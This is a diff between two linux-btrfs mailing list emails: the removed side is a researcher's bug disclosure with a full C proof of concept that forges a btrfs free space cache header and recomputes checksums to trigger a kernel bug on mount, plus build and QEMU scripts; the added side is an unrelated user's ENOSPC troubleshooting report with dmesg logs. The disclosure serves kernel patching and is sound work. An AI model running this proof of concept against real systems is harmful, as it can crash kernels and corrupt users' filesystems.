@@ -1,497 +1,315 @@
-Received: from mail-pg1-f171.google.com (mail-pg1-f171.google.com [209.85.215.171])
+Received: from mail-wm1-f50.google.com (mail-wm1-f50.google.com [209.85.128.50])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8A2CB34C98C
-	for <linux-btrfs@vger.kernel.org>; Wed, 10 Jun 2026 17:51:03 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.215.171
-ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1781113866; cv=pass; b=ffD+3dbgDt0e4ZdBd88Xv3346uPCgls4wn5VB95to8w9Gbe6MUhhSnCc3X+lJSclDjf6gCnQALuiBuvNPCc+CA5MH5VlLlLaUS/gILSlej9dXFxdnvE2NrTdJ+b6C0xWQrwseUF482yZJog7ul8Kd8U7lMwiuVjMonO3AEoc14w=
-ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1781113866; c=relaxed/simple;
-	bh=+AuImVSWZo+j2BF246wOjdIlW2TUpPc9bF2oRxYvPjI=;
-	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
-	 To:Cc:Content-Type; b=JCQcBlSwWjoVOuSlRpmBGnm/WhdEiYF2I1fVYdnAIIAWU70Cqnj91OyUkdkMk4AbHmCKRnhwNnZaY13haJClQipyaQWFspuvx5liZnHruuctqX9i3BFYtSqwzOemEWAO+3vIlebg7P/gCDaVSZTmu9fnCRPooaLfwJWq75fds7w=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=TVTW/+Bn; arc=pass smtp.client-ip=209.85.215.171
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id CC7F23A7F5E
+	for <linux-btrfs@vger.kernel.org>; Wed, 10 Jun 2026 21:05:08 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.128.50
+ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1781125510; cv=none; b=MF93zZu5B+/juiJ4/s1J5cjrA6L8eUFY/s9KCUiCa0wLzUiKWtm/pm/d416ei9Q9lsn0BQ/JIk0j0GCpX+mqgGn2WPTR6d/UbjXHi5W3FkEePIK0o805/+1uEJoY5oP/DAQbEehhSmjiKoXeg4RPoGrr9x29ySvcXx6XjizWCXQ=
+ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1781125510; c=relaxed/simple;
+	bh=uv3Qnxue75ZrzuYwAdf5b+X7xQlYJGx6iukW3Ua6Zpc=;
+	h=Message-ID:Date:MIME-Version:Subject:To:References:From:
+	 In-Reply-To:Content-Type; b=skniwPgPNYgLeOHEPmJowpzlwpTXTswKNC4Ibuw0XZVcrCImEJj766oId4q06AbGWJ952bgTcTP6kI7F4LP3KFsZ56eQhBaZFeSda7Iq3HGeHuMif40WenqxaynTQXxh0vNPKtg0QF1Xfkgiu41p3bt5rW/DIFJYaifLWq1LPWE=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=L58k9rdy; arc=none smtp.client-ip=209.85.128.50
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="TVTW/+Bn"
-Received: by mail-pg1-f171.google.com with SMTP id 41be03b00d2f7-c858961a8efso2684246a12.2
-        for <linux-btrfs@vger.kernel.org>; Wed, 10 Jun 2026 10:51:03 -0700 (PDT)
-ARC-Seal: i=1; a=rsa-sha256; t=1781113863; cv=none;
-        d=google.com; s=arc-20240605;
-        b=GtldAxQ/BGyy8JX1199XZl6uCOJvbwjwk1v4BZAHJxZVYP7BMiVks2qgkAtLIOU4YP
-         RyCXSTXTYXAas4fJ0QpI6ZRBS1MCTMhw/iUxSt4Q85p1z3lo/b+2PlzXxmRncxl3UbvE
-         r7FxdItD0mUM6z80DpMG97KNRkF3sXrqYhPV534t0QwwvRELnLp24+FaUPgJqz7nyzL4
-         9piOFv+5NZ6QTmEB9QPjOQFv5AcbWCFFjtP4H02BLymXpqWk/bEYSDcL78QQJjAcjpfK
-         AoikcCV6BY6qjXRuplufOFHFgfuTy7jqliajLqe2nB3kzlm3TQ8MMNgsSzOdZndjL6EO
-         x52Q==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:dkim-signature;
-        bh=D/VUIzb7849XydDHqppo33mmygchkfCwKfSbG6FSdzA=;
-        fh=27W1wKix81TUVH+uxU1pKdyH5GoWdZVGPnzD8U+FQxY=;
-        b=MQCDZte/G8xwCw4/2tM6AK6SZlTAFFx71zoZtUNwCcNThxxVb5rOuNVHeGk5kZrCSY
-         uL1M4j7eaqAeOBnNZ5g3oNiN7muG/+aQg5opEitHFQWI44LobFMOaiUExMm+LpgBWBdD
-         uqcuZ1NLQP3ewa7K6w9Fha1EJ/AXhwiP4GPMXNiqIjpu/YD9SkWkJucGgis5QUT+XRjI
-         xPVclUOO6g/qSTVSX5y+hfVvAVFPEPoms4HQ78ZL+B9I4XpfLkc3sR7XdCXomKkN8qFK
-         WwRBOr8zXGM3dsKZsIBoULmS3UTwhMSyULXgrksniIzn/JMAF4ufooHRjUW5E62Vrrjq
-         1I3g==;
-        darn=vger.kernel.org
-ARC-Authentication-Results: i=1; mx.google.com; arc=none
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="L58k9rdy"
+Received: by mail-wm1-f50.google.com with SMTP id 5b1f17b1804b1-490cf322ed0so32452115e9.1
+        for <linux-btrfs@vger.kernel.org>; Wed, 10 Jun 2026 14:05:08 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=asu.edu; s=google; t=1781113863; x=1781718663; darn=vger.kernel.org;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:from:to:cc:subject:date
-         :message-id:reply-to;
-        bh=D/VUIzb7849XydDHqppo33mmygchkfCwKfSbG6FSdzA=;
-        b=TVTW/+Bnx75091v5OVcYI7evl+sRARjUrwSGhPU83bFCQtOFICjvhY9k6MR03fmN69
-         Msj499USW5WSB+UOXvSlLZ5q/cjgdljKp3WY/GvWM8/mzf6XGU4WTOeRA30Qds3ZgyBE
-         Y1z2KemaeeXLYRezvfu7zhk6JO7lKVptDHbj8hiEYE0kQV4GmW8c+A/UQl19jHlJQ91Q
-         dep6/1D9S21kiNdVwtmBBnpN2b8A7/9G9YePW6p34pIPdZdBAjxvIjwdVfqv9xwxxb8h
-         xPtZRdUCFJoEY/dgYRI+b79j3ReGv0xOcb/Yk+KemVTYfk1klbZscGGtYbx7Kf3ifXOS
-         LOKw==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1781113863; x=1781718663;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
+        d=gmail.com; s=20251104; t=1781125507; x=1781730307; darn=vger.kernel.org;
+        h=content-transfer-encoding:in-reply-to:from:content-language
+         :references:to:subject:user-agent:mime-version:date:message-id:from
          :to:cc:subject:date:message-id:reply-to;
-        bh=D/VUIzb7849XydDHqppo33mmygchkfCwKfSbG6FSdzA=;
-        b=bF70p5mL4L9VaK9q1UgEIXF83y2CzlHMRwFck3pKRD1OFJOTl67CuDGEHDgcWqrpoI
-         /2SRfqdR6HXoKqGQ9FHTLRuyLRIzhu9sYJUH16yG+EAYPiW+jrQFzAO+eo5s1HvGUE/T
-         2IAd/TLjGEL7CVjyNRBRG5/lK7PFvm5/RBe2TVD+6tkxaETLx6N2pRes1C7UUVMkXl2N
-         gB1pmIrZR2SiWGTcqFofIwzOIqb+dmmzzTsy4FapPu5F3DRzTWCoNYq1daNQVe2cd6xN
-         qdxoQ2zaQHb8LV53svjmrSH4f8W97t+Qthyd7q7yqHXPjmsiB6vCK9RMZ/xbDL7xqRKJ
-         70bA==
-X-Forwarded-Encrypted: i=1; AFNElJ/+WoB40DcyOURbZgP2VxZIfTH6IZXpociYtTYErz1jYsfvLA8cBn0Cb225Uljv7OW3Jm7R5Cnx1buoKw==@vger.kernel.org
-X-Gm-Message-State: AOJu0YwqWIwewy8ARi9XFacPdwTg9gWchk1Zofkopzsren954FCLuUNx
-	SZUm0gi/R2xmwrPvmgcpPW3ZvrMwDdV1QkPSeQn4g3nW9l+ZCwtzCgHkGlsGUWlStEs7rPajlyM
-	aVT2htGeO2RrMpGxCFouzj5asu/FtbChaQH0zJExy
-X-Gm-Gg: Acq92OFwTpRj0Op53NWhrKI28m7VeV/Eh2Llx4l/dTY1grAP+/YyH/dE1WfCwtz2Ur8
-	ZykZVNOwRxF9vmd75PngvepYQqxfwuT9B7hznI0poA41U6FGZdSHm4d7NoAwrPPnAx3+pgohnlI
-	Ob1yWvedCBWl4uASskzodwqoHINHS3wOjcLihkmNNeZ/nW8O8p3Fbf6Y1GbCXZltQb6Poehh25O
-	0gIUyGVvWCJB97nwQJuMAxLXQ1blR4gEgphCso/PxUr3tn0LELriUEWOaOIfxzW5yPcapYZF2xu
-	AIHJywtY3XNIk999QxYbb27Khb+lIEETGMP+B+i75IKp7oIfMCP+
-X-Received: by 2002:a05:6a21:6e04:b0:3b3:2703:110 with SMTP id
- adf61e73a8af0-3b4ccd1b49cmr32065277637.4.1781113862752; Wed, 10 Jun 2026
- 10:51:02 -0700 (PDT)
+        bh=Y3mNKXAGqgbxmf1ZoEPRPgdRPtwi1B+hsTfQVhLfq2Q=;
+        b=L58k9rdyRhiYyDOsb+Gup7A7eZN6444HK3QAwItLScADrDuCDyOs/tUbEOrOEfoLUv
+         tmTSBXbL1iauglc3LoTzOjQmuBTl/z13fyLNU3PTaYHT3Sx0a2lX7RmZZ+C/4NI3cG38
+         HhD2Q/BedfXi0zG6A+1RvTXaLs02Lvmh7+Jj4oloPs7JnSvUFJeG2PfmJ6/+ShN3c7za
+         pO0B+zb0JmCgbHI+Hoodr1qWk/qQ7vZ+4FdO9hCPgKaXmNq1TCwliaTn2i1x9BlEdax/
+         qBsLQ1cd/E0RUh6iflHDfIORJ9a2VyOOnpM6s+/Ybcj3jlWGKQUQgScZqhnOh5dc1saN
+         rIKg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1781125507; x=1781730307;
+        h=content-transfer-encoding:in-reply-to:from:content-language
+         :references:to:subject:user-agent:mime-version:date:message-id
+         :x-gm-gg:x-gm-message-state:from:to:cc:subject:date:message-id
+         :reply-to;
+        bh=Y3mNKXAGqgbxmf1ZoEPRPgdRPtwi1B+hsTfQVhLfq2Q=;
+        b=LUeLY9wdGdOg3ZdnphRtM0nejznLhhEJzO9rkplN6YUn1iClJYqMqyC+4zNzx9T71y
+         E7lAOXMJDLWbNXMG/gR7lP9BIwPCQ+nRqX+cAV4j1MTFG4PRAzYOBjT9CA5AOS2gIZFs
+         VVFcW/zPQgP18pbjd/+pGuGCZdSbwNIhaNcfGgQVyAuBjCtFxT6tEerCo64x1+r8GAlC
+         +OYOGg6en3qB0UFrBpx98q/6W5PnM9TPcuoR583dWjbnmnKdGabun3aOqj2SfaK4lXhG
+         gVURzDBJir3Z43DsyQpDugBHbwiJsBbFHUFWMs2jLwAjYSd8RbQVkeKbSdpjJvPRTBzL
+         +6Rg==
+X-Forwarded-Encrypted: i=1; AFNElJ+gVfKL2k+5+hs4zDiX3+Tv9qVd7ZbFTP8Cgpoycj+61DP7Bv6wXKjBSOA8lnVHZRUBTAXMSJUKH452/Q==@vger.kernel.org
+X-Gm-Message-State: AOJu0YyTMzq0tjU39GhnL3EaYq4B5yz8QYp8UcNLR59YQxsR63TXMrW/
+	h7a1Dy8BFVtYkTfFDR19RBlZuAg2MofOFXi+Dj5iGumSlI/qonLXQ5deMWKN/l1t
+X-Gm-Gg: Acq92OFsnK30MxUuSySXhT8N11WIjb9bMjxbSh37HPYVzG9jpzbmZ2T6yA9Bvdno8nA
+	skWt+iYoEKjKkFoEJ+KCKzCzx5NItMHlU44hA1+MkcP28jBVRiFY0LyazFQrDR7SWu+9/rZnPkQ
+	vycHAk773wXce5EC9hFKl0MLODCRPyEEUD8zoobxxzSKIu4lCBy2UuSQYC2UXcPUsbLg1FYlXy1
+	B7pFlldqIPNcm6z2qAifmZHR9U9msnFyASFt8MlRsCqNlJg9IShjdrI0Eo1IZAwl5NujAlw7WgJ
+	B7wC10gO7wsBG3xTNZmdnxmyF4NrmgDRRvCtaM1/FHEm4N1/FeZyMv4PL8cEhL63czW0DMFaTwU
+	eZrEQBbMJNAwIxSVZtzG77dNdUNhSQcc0sO2KDU6/xBxUJqFgQxS9cTBORY9WLwF7lB5C1345xA
+	z29pIl9refhl+19mRSVhYGOJoVC/7ASduss/9fK4w3YLKNtm+u9kBtXYg/Dk173oAcz9ul6uBsV
+	0cHsbZLdT8DVoAlefPdLRSYHscV8L+JGDc=
+X-Received: by 2002:a05:600c:6091:b0:490:601f:d766 with SMTP id 5b1f17b1804b1-490c259a103mr459462605e9.1.1781125506855;
+        Wed, 10 Jun 2026 14:05:06 -0700 (PDT)
+Received: from [192.168.10.168] (91-175-163-178.subs.proxad.net. [91.175.163.178])
+        by smtp.gmail.com with ESMTPSA id ffacd0b85a97d-4601f2dc577sm76254630f8f.3.2026.06.10.14.05.05
+        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
+        Wed, 10 Jun 2026 14:05:06 -0700 (PDT)
+Message-ID: <28d08133-999f-4d43-9cd5-67b856246687@gmail.com>
+Date: Wed, 10 Jun 2026 23:05:05 +0200
 Precedence: bulk
 X-Mailing-List: linux-btrfs@vger.kernel.org
 List-Id: <linux-btrfs.vger.kernel.org>
 List-Subscribe: <mailto:linux-btrfs+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-btrfs+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-References: <20260610172926.844265-1-xmei5@asu.edu>
-In-Reply-To: <20260610172926.844265-1-xmei5@asu.edu>
-From: Xiang Mei <xmei5@asu.edu>
-Date: Wed, 10 Jun 2026 10:50:51 -0700
-X-Gm-Features: AVVi8CeG7lqtDVtID4-6UHw2h5x2m4CnMZrTMMlLsHSqCHDPtIUVoBmeomliuj0
-Message-ID: <CAPpSM+RMPByMCKXvM5QFKToxsyNccfuFLWMdD0mfd0wh2Ja62w@mail.gmail.com>
-Subject: Re: [PATCH btrfs v2] btrfs: reject free space cache with more entries
- than pages
-To: David Sterba <dsterba@suse.com>, Chris Mason <clm@fb.com>, linux-btrfs@vger.kernel.org
-Cc: Josef Bacik <josef@redhat.com>, Weiming Shi <bestswngs@gmail.com>, linux-kernel@vger.kernel.org
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+User-Agent: Mozilla Thunderbird
+Subject: Re: Btrfs ENOSPC / Stuck in RO with "exclusive operation balance
+ paused in progress"
+To: Chris Murphy <lists@colorremedies.com>,
+ Btrfs BTRFS <linux-btrfs@vger.kernel.org>
+References: <068e841a-37fd-4fe5-ba2d-0ab93c55830d@gmail.com>
+ <abd33b32-aadf-4206-81bc-c2c7832e13dd@gmail.com>
+ <43f6ea2b-8b23-49c1-acfe-1d2617f28132@app.fastmail.com>
+Content-Language: en-US
+From: Alban Browaeys <alban.browaeys@gmail.com>
+In-Reply-To: <43f6ea2b-8b23-49c1-acfe-1d2617f28132@app.fastmail.com>
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 8bit
 
-Thanks for your attention to this bug. We provide the PoC and method
-to trigger the bug in this email.
-
-1) Compile the kernel with the following config
-CONFIG:
-```
-CONFIG_BTRFS_FS=3Dy
-CONFIG_BTRFS_ASSERT=3Dn
-```
-
-2) Build the image with
-```sh
-#!/bin/sh
-set -e
-OUT=3D"${1:-base.img}"
-SIZE=3D"${2:-2G}"
-
-rm -f "$OUT"
-truncate -s "$SIZE" "$OUT"
-mkfs.btrfs -O ^free-space-tree -f "$OUT" >/dev/null
-echo "wrote clean v1-cache btrfs image: $OUT ($SIZE)"
-```
-
-3) Run Qemu with
-```sh
-#!/bin/sh
-set -e
-
-qemu-system-x86_64 \
-        -m 2G -smp 2 -enable-kvm -cpu host \
-        -nographic -no-reboot \
-        -kernel bzImage \
-        -drive file=3Drootfs.img,if=3Dvirtio,format=3Draw \
-        -drive file=3Dbase.img,if=3Dvirtio,format=3Draw \
-        -append "console=3DttyS0 root=3D/dev/vda rw nokaslr oops=3Dpanic pa=
-nic=3D-1"
-```
-
-4) Use the following PoC to trigger the bug
-```c
-// SPDX-License-Identifier: GPL-2.0
-#define _GNU_SOURCE
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <stdint.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <sys/mount.h>
-#include <sys/ioctl.h>
-
-#ifndef DEV
-#define DEV       "/dev/vdc"
-#endif
-#define MNT       "/mnt"
-#define NODESIZE  16384
-#define SECTOR    4096
-#define HDR       0x65
-#define ITEM      25
-#define FSH_SIZE  41
-#define NEW_ENTRIES 0x10000
-static const uint64_t FREE_SPACE_OBJECTID =3D (uint64_t)(-11);
-
-static uint32_t crc32c(const uint8_t *p, size_t n)
-{
-        uint32_t crc =3D ~0u;
-        for (size_t i =3D 0; i < n; i++) {
-                crc ^=3D p[i];
-                for (int k =3D 0; k < 8; k++)
-                        crc =3D (crc >> 1) ^ (0x82F63B78u &
-(-(int32_t)(crc & 1)));
-        }
-        return ~crc;
-}
-
-static uint64_t rd64(const uint8_t *p){ uint64_t v; memcpy(&v,p,8); return =
-v; }
-static uint32_t rd32(const uint8_t *p){ uint32_t v; memcpy(&v,p,4); return =
-v; }
-static void wr64(uint8_t *p, uint64_t v){ memcpy(p,&v,8); }
-static void wr32(uint8_t *p, uint32_t v){ memcpy(p,&v,4); }
-
-static uint64_t logical_to_phys(uint8_t *m, off_t sz, uint64_t logical)
-{
-        for (off_t off =3D 0; off + HDR <=3D sz; off +=3D SECTOR) {
-                if (m[off + 0x64] !=3D 0)
-                        continue;
-                uint32_t nritems =3D rd32(m + off + 0x60);
-                if (nritems =3D=3D 0 || nritems > 2000)
-                        continue;
-                for (uint32_t i =3D 0; i < nritems; i++) {
-                        off_t ip =3D off + HDR + (off_t)i * ITEM;
-                        if (ip + ITEM > sz) break;
-                        if (rd64(m + ip) !=3D 256 || m[ip + 8] !=3D 228)
-                                continue;
-                        uint64_t koff =3D rd64(m + ip + 9);
-                        off_t dp =3D off + HDR + rd32(m + ip + 17);
-                        if (dp + 64 > sz) continue;
-                        uint64_t length =3D rd64(m + dp);
-                        if (logical >=3D koff && logical < koff + length)
-                                return rd64(m + dp + 48 + 8) + (logical - k=
-off);
-                }
-        }
-        return logical;
-}
-
-static void forge_cache_page(uint8_t *m, off_t sz, uint64_t ino)
-{
-        for (off_t off =3D 0; off + HDR <=3D sz; off +=3D SECTOR) {
-                if (m[off + 0x64] !=3D 0)
-                        continue;
-                uint32_t nritems =3D rd32(m + off + 0x60);
-                if (nritems =3D=3D 0 || nritems > 2000)
-                        continue;
-                for (uint32_t i =3D 0; i < nritems; i++) {
-                        off_t ip =3D off + HDR + (off_t)i * ITEM;
-                        if (ip + ITEM > sz) break;
-                        if (rd64(m + ip) !=3D ino || m[ip + 8] !=3D 108)
-                                continue;
-                        off_t dp =3D off + HDR + rd32(m + ip + 17);
-                        if (dp + 53 > sz) continue;
-                        uint64_t disk_bytenr =3D rd64(m + dp + 21);
-                        if (disk_bytenr =3D=3D 0)
-                                continue;
-                        uint64_t num_bytes =3D rd64(m + dp + 45);
-                        int num_pages =3D num_bytes / 4096;
-                        if (num_pages < 1) num_pages =3D 1;
-                        off_t base =3D logical_to_phys(m, sz, disk_bytenr);
-                        if (base + (off_t)num_bytes > sz) continue;
-                        uint8_t *p0 =3D m + base;
-                        int crc_area =3D 4 * num_pages;
-                        uint64_t voff =3D 0x4000000ULL;
-                        for (int pg =3D 0; pg < num_pages; pg++) {
-                                uint8_t *p =3D p0 + (off_t)pg * 4096;
-                                int e =3D (pg =3D=3D 0) ? (crc_area + 8) : =
-0;
-                                for (; e + 17 <=3D 4096; e +=3D 17) {
-                                        wr64(p + e, voff);
-                                        wr64(p + e + 8, 0x1000);
-                                        p[e + 16] =3D 1;
-                                        voff +=3D 0x100000ULL;
-                                }
-                        }
-                        for (int pg =3D 1; pg < num_pages; pg++)
-                                wr32(p0 + pg * 4, crc32c(p0 +
-(off_t)pg * 4096, 4096));
-                        wr32(p0 + 0, crc32c(p0 + crc_area, 4096 - crc_area)=
-);
-                        return;
-                }
-        }
-}
-
-static int patch_device(const char *dev)
-{
-        int fd =3D open(dev, O_RDWR);
-        if (fd < 0) { perror("open"); return -1; }
-        off_t sz =3D lseek(fd, 0, SEEK_END);
-        uint8_t *m =3D malloc(sz);
-        lseek(fd, 0, SEEK_SET);
-        for (off_t got =3D 0; got < sz; ) {
-                ssize_t r =3D read(fd, m + got, sz - got);
-                if (r <=3D 0) break;
-                got +=3D r;
-        }
-
-        int patched =3D 0;
-        for (off_t off =3D 0; off + HDR <=3D sz; off +=3D SECTOR) {
-                if (m[off + 0x64] !=3D 0)
-                        continue;
-                uint32_t nritems =3D rd32(m + off + 0x60);
-                if (nritems =3D=3D 0 || nritems > 2000)
-                        continue;
-                int hit =3D 0;
-                for (uint32_t i =3D 0; i < nritems; i++) {
-                        off_t ip =3D off + HDR + (off_t)i * ITEM;
-                        if (ip + ITEM > sz) break;
-                        uint32_t isize =3D rd32(m + ip + 21);
-                        if (rd64(m + ip) !=3D FREE_SPACE_OBJECTID ||
-                            m[ip + 8] !=3D 0 || isize !=3D FSH_SIZE)
-                                continue;
-                        off_t dptr =3D off + HDR + rd32(m + ip + 17);
-                        if (dptr + FSH_SIZE > sz) continue;
-                        uint64_t fino =3D rd64(m + dptr + 0);
-                        wr64(m + dptr + 25, NEW_ENTRIES);
-                        forge_cache_page(m, sz, fino);
-                        hit =3D 1; patched++;
-                }
-                if (hit)
-                        wr32(m + off, crc32c(m + off + 0x20, NODESIZE - 0x2=
-0));
-        }
-        lseek(fd, 0, SEEK_SET);
-        for (off_t wr =3D 0; wr < sz; ) {
-                ssize_t w =3D write(fd, m + wr, sz - wr);
-                if (w <=3D 0) break;
-                wr +=3D w;
-        }
-        fsync(fd);
-        close(fd);
-        free(m);
-        return patched;
-}
-
-#define BTRFS_IOC_SYNC _IO(0x94, 8)
-
-static int mnt_v1(void)
-{
-        return mount(DEV, MNT, "btrfs", 0, "space_cache=3Dv1");
-}
-
-static void churn(void)
-{
-        static char b[1 << 20];
-        memset(b, 'F', sizeof b);
-        for (int i =3D 0; i < 300; i++) {
-                char p[64]; snprintf(p, sizeof p, MNT "/b%03d", i);
-                int fd =3D open(p, O_CREAT | O_WRONLY, 0644);
-                if (fd >=3D 0) { (void)!write(fd, b, sizeof b);
-fsync(fd); close(fd); }
-        }
-        sync();
-        for (int i =3D 0; i < 300; i +=3D 3) {
-                char p[64]; snprintf(p, sizeof p, MNT "/b%03d", i);
-                unlink(p);
-        }
-        sync();
-}
-
-static void bake_cache(void)
-{
-        static char big[8 << 20];
-        memset(big, 'D', sizeof big);
-
-        mnt_v1();
-        int dfd =3D open(MNT, O_RDONLY | O_DIRECTORY);
-        churn();
-        for (int cyc =3D 0; cyc < 10; cyc++) {
-                char p[64]; snprintf(p, sizeof p, MNT "/dirty%d", cyc);
-                int t =3D open(p, O_CREAT | O_WRONLY, 0644);
-                if (t >=3D 0) { (void)!write(t, big, sizeof big);
-fsync(t); close(t); }
-                if (cyc > 0) {
-                        char q[64]; snprintf(q, sizeof q, MNT
-"/dirty%d", cyc - 1);
-                        unlink(q);
-                }
-                if (dfd >=3D 0) ioctl(dfd, BTRFS_IOC_SYNC, 0);
-                sync();
-        }
-        if (dfd >=3D 0) close(dfd);
-        umount(MNT);
-
-        if (mnt_v1() =3D=3D 0) {
-                int t =3D open(MNT "/again", O_CREAT | O_WRONLY, 0644);
-                if (t >=3D 0) { (void)!write(t, "y", 1); close(t); }
-                churn(); sync(); sleep(1); umount(MNT);
-        }
-        if (mnt_v1() =3D=3D 0) {
-                int t =3D open(MNT "/again2", O_CREAT | O_WRONLY, 0644);
-                if (t >=3D 0) { (void)!write(t, "z", 1); close(t); }
-                sync(); sleep(1); umount(MNT);
-        }
-}
-
-int main(void)
-{
-        mkdir(MNT, 0755);
-
-        bake_cache();
-        puts("[poc] baked v1 cache");
-
-        printf("[poc] patched %d header(s)\n", patch_device(DEV));
-
-        if (mnt_v1()) {
-                perror("[poc] mount(trigger)");
-                return 1;
-        }
-        puts("[poc] remounted; allocating to force block-group caching");
-        for (int i =3D 0; i < 8; i++) {
-                char p[64]; snprintf(p, sizeof p, MNT "/t%d", i);
-                int fd =3D open(p, O_CREAT | O_WRONLY, 0644);
-                if (fd >=3D 0) {
-                        char b[65536]; memset(b, 'a' + i, sizeof b);
-                        for (int j =3D 0; j < 16; j++)
-                                if (write(fd, b, sizeof b) < 0) break;
-                        fsync(fd); close(fd);
-                }
-        }
-        sync();
-        sleep(2);
-        puts("[poc] no crash (kernel is patched?)");
-        return 0;
-}
-```
-
-
-Feel free to let us know if you'd like more information about this
-bug. We are glad to help.
-
-Best,
-Xiang
-
-On Wed, Jun 10, 2026 at 10:29=E2=80=AFAM Xiang Mei <xmei5@asu.edu> wrote:
+Le 09/06/2026 à 17:25, Chris Murphy a écrit :
+> Try:
 >
-> When loading a v1 free space cache, __load_free_space_cache() takes
-> num_entries and num_bitmaps straight from the on-disk
-> btrfs_free_space_header. That header is stored in the tree_root under a k=
-ey
-> with type 0, which the tree-checker has no case for, so neither count is
-> validated before the load trusts it.
+> mount -o skip_balance,nospace_cache,enospc_debug /dev/sdb3 /var
+> btrfs balance start -dlimit=1 /var
+
+
+Thanks for the suggestions. Unfortunately, the bypass did not work.
+
+# mount -o skip_balance,nospace_cache,enospc_debug /dev/sdb3 /var
+[117052.507168] BTRFS: device label SSDHOME devid 1 transid 44655875 /dev/sdb3 (8:19) scanned by mount (2004)
+[117052.526475] BTRFS info (device sdb3): first mount of filesystem 13af326c-631f-482b-9c34-b59b4f100608
+[117052.536146] BTRFS info (device sdb3): using crc32c checksum algorithm
+[117052.543125] BTRFS error (device sdb3): cannot disable free-space-tree
+[117052.550097] BTRFS error (device sdb3): open_ctree failed: -22
+mount: /var: wrong fs type, bad option, bad superblock on /dev/sdb3, missing codepage or helper program, or other error.
+        dmesg(1) may have more information after failed mount system call.
+
+
+I believe this issue is blocking me:
+
+[117052.543125] BTRFS error (device sdb3): cannot disable free-space-tree
+
+So I tried with enospc_debug without nospace_cache, to get debug infos:
+
+# mount -o skip_balance,enospc_debug /dev/sdb3 /var
+[117261.590047] BTRFS: device label SSDHOME devid 1 transid 44655875 /dev/sdb3 (8:19) scanned by mount (2008)
+[117261.612863] BTRFS info (device sdb3): first mount of filesystem 13af326c-631f-482b-9c34-b59b4f100608
+[117261.622548] BTRFS info (device sdb3): using crc32c checksum algorithm
+[117261.662415] BTRFS info (device sdb3): left=0, need=393216, flags=36
+[117261.669328] BTRFS info (device sdb3): space_info SYSTEM (sub-group id 0) has 0 free, is not full
+[117261.678792] BTRFS info (device sdb3): space_info total=33554432, used=16384, pinned=0, reserved=0, may_use=0, readonly=33538048 zone_unusable=0
+[117261.692344] BTRFS info (device sdb3): global_block_rsv: size 190382080 reserved 190382080
+[117261.701131] BTRFS info (device sdb3): trans_block_rsv: size 0 reserved 0
+[117261.708349] BTRFS info (device sdb3): chunk_block_rsv: size 0 reserved 0
+[117261.715571] BTRFS info (device sdb3): remap_block_rsv: size 0 reserved 0
+[117261.722782] BTRFS info (device sdb3): delayed_block_rsv: size 0 reserved 0
+[117261.730154] BTRFS info (device sdb3): delayed_refs_rsv: size 0 reserved 0
+[117261.737462] BTRFS error (device sdb3): allocation failed flags 36, wanted 16384 tree-log 0, relocation: 0
+[117261.747497] BTRFS info (device sdb3): space_info METADATA (sub-group id 0) has -190382080 free, is full
+[117261.757371] BTRFS info (device sdb3): space_info total=3221225472, used=2142470144, pinned=0, reserved=0, may_use=190382080, readonly=1078755328 zone_unusable=0
+[117261.772172] BTRFS info (device sdb3): global_block_rsv: size 190382080 reserved 190365696
+[117261.780844] BTRFS info (device sdb3): trans_block_rsv: size 0 reserved 0
+[117261.787995] BTRFS info (device sdb3): chunk_block_rsv: size 0 reserved 0
+[117261.795127] BTRFS info (device sdb3): remap_block_rsv: size 0 reserved 0
+[117261.802251] BTRFS info (device sdb3): delayed_block_rsv: size 0 reserved 0
+[117261.809551] BTRFS info (device sdb3): delayed_refs_rsv: size 0 reserved 0
